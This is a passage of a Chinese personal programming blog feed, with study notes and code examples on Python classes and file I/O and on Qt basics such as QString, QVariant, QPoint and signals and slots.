class="hljs-built_in">id</span>,name)<span class="hljs-comment"># 调用构造函数</span><br>        self.other_subjects=other_subjects<br>   <br>   <br>   <br>   <br>chg=Student(<span class="hljs-string">&quot;10010&quot;</span>,<span class="hljs-string">&quot;chg&quot;</span>)<br><span class="hljs-built_in">print</span>(chg.<span class="hljs-built_in">id</span>)<br><span class="hljs-built_in">print</span>(chg.grades)<br>chg.set_grades(<span class="hljs-string">&quot;数学&quot;</span>,<span class="hljs-number">122</span>)<br><span class="hljs-built_in">print</span>(chg.grades)<br>chg.print_grades()<br>   <br>   <br><span class="hljs-comment"># 创建子类</span><br>test_student=Pupils(<span class="hljs-number">244</span>,<span class="hljs-string">&quot;test_student&quot;</span>,<span class="hljs-string">&quot;C语言&quot;</span>)<br><span class="hljs-built_in">print</span>(test_student.other_subjects)<br>   <br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>文件读取的模式有一下几种</p><p><img src="https://python-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0image-20230714145153111.png" alt="image-20230714145153111"></p><ol><li><p>读文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">file=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\12414\\Desktop\\test.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>   <br><span class="hljs-built_in">print</span>(file.readline())<span class="hljs-comment"># 读一行</span><br><span class="hljs-built_in">print</span>(file.read(<span class="hljs-number">10</span>))<br>file.seek(<span class="hljs-number">0</span>)<br>   <br>   <br><span class="hljs-comment"># 使用while读取文本</span><br><span class="hljs-built_in">str</span>=file.readline()<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">str</span>!=<span class="hljs-string">&quot;&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-built_in">str</span>=file.readline()<br>   <br><span class="hljs-comment"># 使用列表</span><br>file.seek(<span class="hljs-number">0</span>)<br>lines=file.readlines()<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    <span class="hljs-built_in">print</span>(line)<br>   <br>file.close()<br>   <br>   <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\12414\\Desktop\\test.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<span class="hljs-comment"># 执行完后会自动关闭</span><br>    <span class="hljs-built_in">print</span>(file.readline())<br>   <br>   <br></code></pre></td></tr></table></figure></li><li><p>写文件</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\12414\\Desktop\\test.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<span class="hljs-comment"># 遍历</span><br>    file.write(<span class="hljs-string">&quot;this a string&quot;</span>)<br>   <br>   <br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>qt随记</title>
    <link href="/2023/06/29/QT/qt%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/06/29/QT/qt%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<ol><li><p>QT的输出是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;i&#x27;m august&quot;</span>;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>QT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QT</title>
    <link href="/2023/06/26/QT/QT/"/>
    <url>/2023/06/26/QT/QT/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="QT"><a href="#QT" class="headerlink" title="QT"></a>QT</h1><h2 id="认识QT"><a href="#认识QT" class="headerlink" title="认识QT"></a>认识QT</h2><p><img src="https://qt-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230627140342469.png"></p><ol><li><p>添加窗口</p><ol><li><p>在项目名的位置添加新的文件</p></li><li><p>在<code>mainwindow.cpp</code>里面的构造函数在新建一个自己的窗口类名</p></li><li><p>通过<code>new</code>指定父对象经行选择是内嵌的窗口还是在外的</p></li><li><p>调用<code>show</code>方法才能显示窗口</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++">MainWindow::<span class="hljs-built_in">MainWindow</span>(QWidget *parent) :<br>    <span class="hljs-built_in">QMainWindow</span>(parent),<br>    <span class="hljs-built_in">ui</span>(<span class="hljs-keyword">new</span> Ui::MainWindow)<br>&#123;<br>    ui-&gt;<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>    FormTest* test=<span class="hljs-keyword">new</span> FormTest;<br>    test-&gt;<span class="hljs-built_in">show</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    FormTest* test2=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FormTest</span>(<span class="hljs-keyword">this</span>);<br>    test2-&gt;<span class="hljs-built_in">show</span>();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br>      <br>MainWindow::~<span class="hljs-built_in">MainWindow</span>()<br>&#123;<br>    <span class="hljs-keyword">delete</span> ui;<br>&#125;<br>      <br></code></pre></td></tr></table></figure></li></ol></li><li><p><code>QDialog</code>介绍</p><ul><li>因为该窗口不是嵌入的，所以只有自己调用自己才能显示</li><li>模态显示和非模态显示<ul><li>非模态显示不能进行窗口切换，程序会堵塞，只有关闭窗口才会向下进行</li></ul></li></ul></li><li><p>Qmainwindow</p><ul><li>具有工具栏和状态栏</li></ul></li><li><p>QT的坐标系</p><p><img src="https://qt-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230628082141502.png"></p></li><li><p>创建按钮，并移动和管理大小</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++">    <span class="hljs-comment">//创建按钮</span><br>QPushButton* butA=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QPushButton</span>(<span class="hljs-keyword">this</span>);<br>butA-&gt;<span class="hljs-built_in">move</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>);<span class="hljs-comment">//相对于父类坐标系的位置</span><br>butA-&gt;<span class="hljs-built_in">setFixedSize</span>(<span class="hljs-number">100</span>,<span class="hljs-number">100</span>);<span class="hljs-comment">//控制按钮的大小</span><br>   <br>QPushButton* butB=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QPushButton</span>(butA);<br>butB-&gt;<span class="hljs-built_in">move</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>);<br>butB-&gt;<span class="hljs-built_in">setFixedSize</span>(<span class="hljs-number">50</span>,<span class="hljs-number">50</span>);<br>   <br></code></pre></td></tr></table></figure></li><li><p>QT的内存机制</p><ul><li>​会回收<code>QObjetc</code>及其子类的内存</li></ul><p><img src="https://qt-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230628125338281.png"></p></li></ol><h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><ol><li>封装了c++的基本类型</li><li>建议使用c++原本的类型</li></ol><h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><p><img src="https://qt-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230629175549828.png" alt="image-20230629175549828"></p><ul><li><p>构造函数</p><p><img src="https://qt-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230629175753092.png"></p></li><li><p>添加到尾部</p><ul><li><code>append</code></li><li><code>push_back</code></li></ul></li><li><p>转换关系</p><p><img src="https://qt-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/image-20230629214952983.png" alt="image-20230629214952983"></p></li><li><p><code>Qstring</code>的格式化</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">QString qString=<span class="hljs-built_in">QString</span>(<span class="hljs-string">&quot;this is a test for arg: my girlfriend is %1, and my wife is %2&quot;</span>).<span class="hljs-built_in">arg</span>(<span class="hljs-string">&quot;zjy&quot;</span>).<span class="hljs-built_in">arg</span>(<span class="hljs-string">&quot;zjy2&quot;</span>);<br>    <br></code></pre></td></tr></table></figure></li><li><p><code>QString</code>和<code>QArray</code></p></li></ul><h3 id="Qvariant"><a href="#Qvariant" class="headerlink" title="Qvariant"></a>Qvariant</h3><ol><li>创建对象的方法<ul><li>使用带参构造</li><li>创建空对象，然会调用<code>setvalue</code>方法</li><li>使用静态函数</li></ul></li><li>使用方法<ul><li>调用<code>type()</code>方法  -&gt;  <code>to...()</code></li></ul></li></ol><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><ul><li><p>创建不能像普通的c++那样，必须使用宏声明一下</p><p>宏：<code>Q_DECLARE_METATYPE(MyTest)</code></p><figure class="highlight qt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs qt">struct <span class="hljs-title">myTest</span>&#123;<br>    <span class="hljs-built_in">int</span> testInt;<br>    <span class="hljs-built_in">double</span> testDouble;<br>&#125;;<br>Q_DECLARE_METATYPE(MyTest)<br></code></pre></td></tr></table></figure></li></ul><h3 id="QPoint"><a href="#QPoint" class="headerlink" title="QPoint"></a>QPoint</h3><ol><li><p>构造函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 构造函数</span><br><span class="hljs-comment">// 构造一个坐标原点, 即(0, 0)</span><br>QPoint::<span class="hljs-built_in">QPoint</span>();<br><span class="hljs-comment">// 参数为 x轴坐标, y轴坐标</span><br>QPoint::<span class="hljs-built_in">QPoint</span>(<span class="hljs-type">int</span> xpos, <span class="hljs-type">int</span> ypos);<br></code></pre></td></tr></table></figure></li><li><p>重新设置坐标点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//设置x,y的点    </span><br>qPonit.<span class="hljs-built_in">setX</span>(x);<br>   qPoint.<span class="hljs-built_in">setY</span>(y);<br>   <br></code></pre></td></tr></table></figure></li><li><p>部分代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++">    <span class="hljs-comment">//给QVariant使用自定义的类型</span><br>    myTest test1;<br>    test1.testInt=<span class="hljs-number">520</span>;<br>    test1.testDouble=<span class="hljs-number">13.14</span>;<br>   <br>   <br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 1</span><br>    QVariant v1;<br>    v1.<span class="hljs-built_in">setValue</span>(test1);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    QVariant v1=QVariant::<span class="hljs-built_in">fromValue</span>(test1);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">//调用QVariant</span><br>    <span class="hljs-keyword">if</span>(v1.<span class="hljs-built_in">canConvert</span>&lt;myTest&gt;())&#123;<br>        <span class="hljs-keyword">auto</span> tem=v1.<span class="hljs-built_in">value</span>&lt;myTest&gt;();<br>        <span class="hljs-built_in">qDebug</span>()&lt;&lt;tem.testInt&lt;&lt;<span class="hljs-string">&quot;  &quot;</span>&lt;&lt;tem.testDouble;<br>    &#125;<br>   <br>    <span class="hljs-comment">//学习使用QPoint</span><br>    QPoint qPoint;<span class="hljs-comment">//坐标在0，0</span><br>    <span class="hljs-type">int</span> x=&#123;<span class="hljs-number">6</span>&#125;,y=&#123;<span class="hljs-number">5</span>&#125;;<br>    <span class="hljs-function">QPoint <span class="hljs-title">qPoint2</span><span class="hljs-params">(x,y)</span></span>;<span class="hljs-comment">//坐标在x,y</span><br>   <br>    <span class="hljs-comment">//重新设置x,y</span><br>    qPoint.<span class="hljs-built_in">setX</span>(x);<br>    qPoint.<span class="hljs-built_in">setY</span>(y);<br>   <br>    <span class="hljs-comment">//得到x,y的坐标</span><br>    x=qPoint.<span class="hljs-built_in">x</span>();<span class="hljs-comment">//得到值的拷贝</span><br>    y=qPoint.<span class="hljs-built_in">y</span>();<br>    <span class="hljs-keyword">auto</span> p_x=qPoint.<span class="hljs-built_in">rx</span>();<span class="hljs-comment">//得到引用</span><br>    <span class="hljs-keyword">auto</span> p_y=qPoint.<span class="hljs-built_in">ry</span>();<br>   <br>   <br>    <span class="hljs-built_in">qDebug</span>()&lt;&lt;p_x&lt;&lt;<span class="hljs-string">&quot;  &quot;</span>&lt;&lt;p_y&lt;&lt;<span class="hljs-string">&quot;  &quot;</span>&lt;&lt;x&lt;&lt;<span class="hljs-string">&quot;  &quot;</span>&lt;&lt;y&lt;&lt;<span class="hljs-string">&quot;  &quot;</span>;<br></code></pre></td></tr></table></figure></li></ol><h3 id="QLine"><a href="#QLine" class="headerlink" title="QLine"></a>QLine</h3><ol><li><p>直线类</p></li><li><p>构造函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 构造函数</span><br><span class="hljs-comment">// 构造一个空对象</span><br>QLine::<span class="hljs-built_in">QLine</span>();<br><span class="hljs-comment">// 构造一条直线, 通过两个坐标点</span><br>QLine::<span class="hljs-built_in">QLine</span>(<span class="hljs-type">const</span> QPoint &amp;p1, <span class="hljs-type">const</span> QPoint &amp;p2);<br><span class="hljs-comment">// 从点 (x1, y1) 到 (x2, y2)</span><br>QLine::<span class="hljs-built_in">QLine</span>(<span class="hljs-type">int</span> x1, <span class="hljs-type">int</span> y1, <span class="hljs-type">int</span> x2, <span class="hljs-type">int</span> y2);<br><br></code></pre></td></tr></table></figure></li><li><p>得到坐标或者点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">   <br><span class="hljs-comment">//获得点的坐标</span><br><span class="hljs-keyword">auto</span> x1_forGet=qLine2.<span class="hljs-built_in">x1</span>();<span class="hljs-comment">//返回x1的坐标点</span><br><span class="hljs-keyword">auto</span> y1_forGet=qLine2.<span class="hljs-built_in">y1</span>();<span class="hljs-comment">//返回x2的坐标点</span><br></code></pre></td></tr></table></figure></li><li><p>平移直线</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">     <br><span class="hljs-comment">//获得点的坐标</span><br><span class="hljs-keyword">auto</span> x1_forGet=qLine2.<span class="hljs-built_in">x1</span>();<span class="hljs-comment">//返回x1的坐标点</span><br><span class="hljs-keyword">auto</span> y1_forGet=qLine2.<span class="hljs-built_in">y1</span>();<span class="hljs-comment">//返回x2的坐标点</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="QSize"><a href="#QSize" class="headerlink" title="QSize"></a>QSize</h3><ol><li>有两个成员变量，具有长度和宽度</li></ol><h3 id="QRect"><a href="#QRect" class="headerlink" title="QRect"></a>QRect</h3><ol><li>用于描述一个矩形</li></ol><h3 id="Qdate"><a href="#Qdate" class="headerlink" title="Qdate"></a>Qdate</h3><ol><li>QDate 类可以封装日期信息也可以通过这个类得到日期相关的信息，包括: 年 , 月 , 日。</li></ol><h3 id="QTime"><a href="#QTime" class="headerlink" title="QTime"></a>QTime</h3><ol><li>QTime 类可以封装时间信息也可以通过这个类得到时间相关的信息，包括: 时 , 分 , 秒 , 毫秒。</li></ol><h3 id="QDtateTime"><a href="#QDtateTime" class="headerlink" title="QDtateTime"></a>QDtateTime</h3><ol><li>QDateTime 类可以封装日期和时间信息也可以通过这个类得到日期和时间相关的信息，包括: 年 , 月 , 日 , 时 , 分 , 秒 , 毫秒。其实这个类就是 QDate 和 QTime 这两个类的结合体。</li></ol><h2 id="信号和信号槽"><a href="#信号和信号槽" class="headerlink" title="信号和信号槽"></a>信号和信号槽</h2><ol><li><p>信号和信号槽</p><blockquote><p>当某个事件发生之后，比如，按钮检测到自己被点击了一下，它就会发出一个信号（signal）。这种发出是没有目的的，类似广播。如果有对象对这个信号感兴趣，它就会使用连接（connect）函数，意思是，将想要处理的信号和自己的一个函数（称为槽（slot））绑定来处理这个信号。也就是说，当信号发出时，被连接的槽函数会自动被回调。这就类似观察者模式：当发生了感兴趣的事件，某一个操作就会被自动触发。</p></blockquote></li><li><p>简单示范，绑定事件和信号</p><p>使用<code>connect()</code>绑定信号和信号槽</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//实现关闭窗口</span><br>    <span class="hljs-built_in">connect</span>(ui-&gt;closeBut,&amp;QPushButton::clicked,<span class="hljs-keyword">this</span>,MainWindow::close);<br></code></pre></td></tr></table></figure></li><li><p>信号的自定义</p><ul><li>自定义信号就是定义一个函数，但是这个函数是signals，权限的</li><li>自定义信号我们需要使用<code>Q_OBJECT</code>的宏然后就可以采用这个函数一调用这个信号。</li><li>而且该函数的返回值必须为空</li><li>信号是可以重载的</li></ul><blockquote><p>信号是类的成员函数<br>返回值必须是 void 类型<br>信号的名字可以根据实际情况进行指定<br>参数可以随意指定, 信号也支持重载<br>信号需要使用 signals 关键字进行声明, 使用方法类似于public等关键字<br>信号函数只需要声明, 不需要定义(没有函数体实现)<br>在程序中发射自定义信号: 发送信号的本质就是调用信号函数<br>习惯性在信号函数前加关键字: emit, 但是可以省略不写<br>emit只是显示的声明一下信号要被发射了, 没有特殊含义<br>底层 emit &#x3D;&#x3D; #define emit</p></blockquote></li><li><p>信号的使用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++">信号是类的成员函数<br>返回值必须是 <span class="hljs-type">void</span> 类型<br>信号的名字可以根据实际情况进行指定<br>参数可以随意指定, 信号也支持重载<br>信号需要使用 signals 关键字进行声明, 使用方法类似于<span class="hljs-keyword">public</span>等关键字<br>信号函数只需要声明, 不需要定义(没有函数体实现)<br>在程序中发射自定义信号: 发送信号的本质就是调用信号函数<br>习惯性在信号函数前加关键字: emit, 但是可以省略不写<br>emit只是显示的声明一下信号要被发射了, 没有特殊含义<br>底层 emit == <span class="hljs-meta">#<span class="hljs-keyword">define</span> emit</span><br>   <br></code></pre></td></tr></table></figure></li><li><p>槽函数的自定义</p><ul><li><p>使用关键词<code>slots</code>，可以省略，但是为了代码格式话，更好是使用这个关键词</p></li><li><p>返回值也必须是void</p></li><li><p>函数的参数和信号是的参数是一致的，但是如果对数据没有处理也可以不去接收</p></li><li><p>槽函数的类型是多样的，我们可以使用</p><p>伪函数，成员函数，匿名函数，全局函数</p><blockquote><p>返回值必须是 void 类型</p><p>槽也是函数, 因此也支持重载</p><p>槽函数需要指定多少个参数, 需要看连接的信号的参数个数</p><p>槽函数的参数是用来接收信号传递的数据的, 信号传递的数据就是信号的参数</p><p>举例:<br>信号函数: void testsig (int a, double b);<br>槽函数: void testslot (int a, double b);<br>总结:<br>槽函数的参数应该和对应的信号的参数个数，从左到右类型依次对应<br>信号的参数可以大于等于槽函数的参数个数 &#x3D;&#x3D; 信号传递的数据被忽略了<br>信号函数: void testsig (int a, double b);<br>槽函数: void testslot (int a);<br>Qt中槽函数的类型是多样的</p><p>Qt 中的槽函数可以是类的成员函数、全局函数、静态函数、Lambda表达式（匿名函数）</p><p>槽函数可以使用关键字进行声明: slots (Qt5中slots可以省略不写)</p><p>public slots:<br>private slots: –&gt; 这样的槽函数不能在类外部被调用<br>protected slots: –&gt; 这样的槽函数不能在类外部被调用</p></blockquote></li></ul></li><li><p>下面是使用实例</p><p>slot:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> once</span><br>   <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QObject&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;QDebug&quot;</span></span><br>   <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Qtslot</span>  : <span class="hljs-keyword">public</span> QObject<br>&#123;<br>    Q_OBJECT<br>   <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//Qtslot(QObject *parent);</span><br>    <span class="hljs-comment">//~Qtslot();</span><br>   <br><span class="hljs-keyword">public</span> slots:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_slot</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-built_in">qDebug</span>() &lt;&lt; <span class="hljs-string">&quot;eat shit!&quot;</span>;<br>    &#125;<br>&#125;;<br>   <br></code></pre></td></tr></table></figure><p>signal:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++">   <br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> once</span><br>   <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QObject&gt;</span></span><br>   <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Qtgirl</span>  : <span class="hljs-keyword">public</span> QObject<br>&#123;<br>    Q_OBJECT<br>   <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//Qtgirl(QObject *parent);</span><br>    <span class="hljs-comment">//~Qtgirl();</span><br>   <br>signals:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_signal</span><span class="hljs-params">()</span></span>;<br>&#125;;<br>   <br></code></pre></td></tr></table></figure><p>信号槽的调用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;QtWidgetsApplication1.h&quot;</span></span><br>   <br>QtWidgetsApplication1::<span class="hljs-built_in">QtWidgetsApplication1</span>(QWidget *parent)<br>    : <span class="hljs-built_in">QMainWindow</span>(parent)<br>&#123;<br>    ui.<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br>   <br>    <span class="hljs-comment">//创建信号槽</span><br>    qtslot = <span class="hljs-keyword">new</span> Qtslot;<br>    qtgirl = <span class="hljs-keyword">new</span> Qtgirl;<br>   <br>    <span class="hljs-built_in">connect</span>(qtgirl, &amp;Qtgirl::test_signal, qtslot, &amp;Qtslot::test_slot);<span class="hljs-comment">//注意函数参数的使用</span><br>   <br>   <br>    <span class="hljs-comment">//绑定按钮</span><br>    <span class="hljs-built_in">connect</span>(ui.eat, &amp;QPushButton::clicked, <span class="hljs-keyword">this</span>, &amp;QtWidgetsApplication1::launchSignal);<span class="hljs-comment">//最后一个参数不能使用()</span><br>   <br>&#125;<br>   <br>QtWidgetsApplication1::~<span class="hljs-built_in">QtWidgetsApplication1</span>()<br>&#123;&#125;<br>   <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QtWidgetsApplication1::launchSignal</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    emit qtgirl-&gt;<span class="hljs-built_in">test_signal</span>();<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li><li><p>信号槽的扩展</p><ul><li>一个信号可以使用槽函数</li><li>一个槽函数也可以是相关多个信号</li><li>可以使用信号连接信号，就可以不用使用<code>emit</code></li></ul></li><li><p>连接方式（对函数进行了重载）</p><ul><li><p>QT4</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">connect</span>(qtgirl, <span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">test_signal</span>()), qtslot,<span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">test_slot</span>()));<span class="hljs-comment">//注意函数参数的使用</span><br>   <br>   <span class="hljs-built_in">connect</span>(qtgirl, <span class="hljs-built_in">SIGNAL</span>(<span class="hljs-built_in">test_signal</span>(QString)), qtslot,<span class="hljs-built_in">SLOT</span>(<span class="hljs-built_in">test_slot</span>(QString)));<span class="hljs-comment">//注意函数参数的使用</span><br>     <br>        <br></code></pre></td></tr></table></figure></li><li><p>QT5</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 